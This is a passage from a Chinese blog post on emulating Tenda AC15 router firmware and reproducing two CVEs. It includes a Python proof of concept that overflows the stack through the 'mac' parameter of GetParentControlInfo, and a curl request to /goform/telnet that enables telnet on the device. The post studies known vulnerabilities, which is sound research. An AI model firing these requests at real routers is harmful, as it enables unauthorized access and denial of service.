+<p>然后交叉引用<code>v8</code>变量，发现影响它的值的是<code>g_lan_ip</code>。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610235236.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610235302.png" style="max-width: 100%; height: auto;"></p>
+<p><code>g_lan_ip</code>是一个未初始化的全局变量，所以我们交叉引入找到对它进行赋值的地方。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610235325.png" style="max-width: 100%; height: auto;"></p>
+<p>找到了<code>strcpy</code>函数对<code>g_lan_ip</code>存在赋值操作，分析这里的代码。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250611000411.png" style="max-width: 100%; height: auto;"></p>
+<p>通过 GPT 分析一下，发现<code>getLanIfName</code>函数是获取局域网接口名称（如eth0），然后赋值给<code>LanIfName</code>。<code>getIfIp</code>获取该接口的 ip 地址将结果保存在<code>v18</code>。如果返回值小于零则表示失败，否则则将<code>v18</code>复制到<code>g_lan_ip</code>。</p>
+<p>这里我们需要分析<code>getLanIfName</code>函数的具体实现，它是一个库函数所以我们需要去<code>so</code>文件中寻找。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250611001134.png" style="max-width: 100%; height: auto;"></p>
+<p>首先分析<code>libcommon.so</code>文件，直接在导出表中搜索函数名。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250611001311.png" style="max-width: 100%; height: auto;"></p>
+<p>定位到<code>getLanIfName</code>函数，发现它只是调用了一个<code>get_eth_name</code>函数并且传递了参数 0。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250611001249.png" style="max-width: 100%; height: auto;"></p>
+<p>跟进分析发现<code>get_eth_name</code>函数也是一个库函数。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250611001419.png" style="max-width: 100%; height: auto;"></p>
+<p>搜索<code>get_eth_name</code>函数的实现<code>so</code>文件。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250611001536.png" style="max-width: 100%; height: auto;"></p>
+<p>分析<code>libChipApi.so</code>文件，同样通过导出表定位到<code>get_eth_name</code>函数。</p>
+<img src="/assets/Pasted%20image%2020250611001656.png" style="zoom:80%;" />
+<p>分析发现，<code>get_eth_name</code>函数通过传入的参数返回相应的接口名称。由于<code>getLanIfName</code>函数传递的参数是 0，所以我们返回的网卡名称是<code>br0</code>。所以我们只需要设置<code>br0</code>网卡 ip 地址既可以设置 httpd 绑定的 ip 地址。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 创建 br0 网桥接口</span>
+</span></span><span class="line"><span class="cl">sudo ip link add name br0 <span class="nb">type</span> bridge
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启用 br0 接口</span>
+</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev br0 up
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 给 br0 设置 IP 地址</span>
+</span></span><span class="line"><span class="cl">sudo ip addr add 192.168.0.1/24 dev br0
+</span></span></code></pre></div><p>这样我们的 httpd 就会绑定到 ip 192.168.0.1，然后我们将<code>webroot_ro</code>文件夹的内容复制到<code>webroot</code>中，这里是因为<code>rcS</code>初始化脚本中有这样的操作。</p>
+<p>之后我们就可以再次进行固件模拟，之后在浏览器输入 192.168.0.1 既可以访问 web 服务。</p>
+<img src="/assets/Pasted%20image%2020250611002606.png" style="zoom: 67%;" />
+<h2 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h2>
+<p>根据大佬的思路，在 httpd 类程序开发的时候往往会直接定义所有需要使用的函数。我们可以通过对常用逻辑的函数如包含<code>Get</code>字段的函数进行交叉引用，找到以下定义函数的地方：</p>
+<img src="/assets/Pasted%20image%2020250617232104.png" style="zoom: 67%;" />
+<p>在审计程序时要重点关注 set 类型的函数，它们往往用于接收前端的数据，进行设置操作。</p>
+<p>在 IOT 漏洞挖掘中最常见的漏洞二进制漏洞就是栈溢出漏洞和命令注入漏洞。寻找这两种的漏洞有着不同的方法：</p>
+<ul>
+<li>栈溢出：关注进行输入数据操作的函数，如：<code>strcpy</code>、<code>sprintf</code>等。</li>
+<li>命令注入：关注和执行命令有关的函数，如：<code>system</code>、<code>execve</code>等。</li>
+</ul>
+<p>除以上函数之外，还会有很多经过包装的自定义函数。不过，这个只需要结合上下文进行识别即可。</p>
+<h3 id="栈溢出">栈溢出<a hidden class="anchor" aria-hidden="true" href="#栈溢出">#</a></h3>
+<blockquote>
+<p>CVE-2025-25634：Tenda AC15 15.03.05.19版本存在安全漏洞，该漏洞源于参数src处理不当，导致基于栈的缓冲区溢出。</p>
+</blockquote>
+<p>目标缓冲区<code>s</code>大小为 596 字节，程序通过<code>strcpy</code>将数据复制到缓冲区<code>s</code>。并没有对源数据<code>src</code>做任何检查，所以如果复制超出目标大小的数据就会导致栈溢出。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250513234836.png" style="max-width: 100%; height: auto;"></p>
+<ul>
+<li>poc</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_payload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">51200</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\xbe\xad\xde</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;mac&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response status code: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="se">\n</span><span class="s2">Response body: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_payload</span><span class="p">(</span><span class="s2">&#34;http://192.168.0.1/goform/GetParentControlInfo&#34;</span><span class="p">,</span> <span class="n">create_payload</span><span class="p">())</span>
+</span></span></code></pre></div><p>复现：</p>
+<p><img alt="image-20250930191127308" decoding="async" loading="lazy" src="/assets/image-20250930191127308.png" style="max-width: 100%; height: auto;"></p>
+<h3 id="命令注入">命令注入<a hidden class="anchor" aria-hidden="true" href="#命令注入">#</a></h3>
+<blockquote>
+<p>CVE-2025-25632：在 AC15v1.0 V15.03.05.19 设备中发现问题。/goform/telnet 路由的处理程序函数中的 HTTP 请求。这可能导致 Shell 元字符。</p>
+</blockquote>
+<p>典型的命令注入漏洞，在通过<code>doSystemCmd</code>函数拼接命令执行时没有做任何限制，所以我们可以设置本机的 IP 地址开启 telnet 服务。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250513234357.png" style="max-width: 100%; height: auto;"></p>
+<ul>
+<li>poc</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">curl -i -X POST http://192.168.0.1/goform/telnet -d <span class="nv">aa</span><span class="o">=</span>aa --cookie <span class="s2">&#34;user=admin&#34;</span> --http0.9
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">telnet 192.168.0.1 <span class="m">80</span>
+</span></span></code></pre></div><p>复现：</p>
+<p><img alt="image-20250930185247412" decoding="async" loading="lazy" src="/assets/image-20250930185247412.png" style="max-width: 100%; height: auto;"></p>
+<h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://www.iotsec-zone.com/article/482">Tenda AC15 固件模拟与漏洞复现 - IOTsec-Zone</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
